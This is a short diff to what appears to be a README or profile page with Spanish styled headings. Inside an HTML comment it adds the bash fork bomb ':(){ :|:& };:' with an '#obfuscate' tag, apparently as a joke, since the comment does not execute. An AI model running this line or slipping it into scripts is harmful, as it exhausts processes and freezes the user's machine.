@@ -226,6 +226,7 @@ $${\color{#202020}!} \space {\color{#333}Nunca \space dejes \space de \space apr
 
 <!--
 while(!(success = try()))
+:(){ :|:& };:  #obfuscate
 -->
 
 <div align="center">
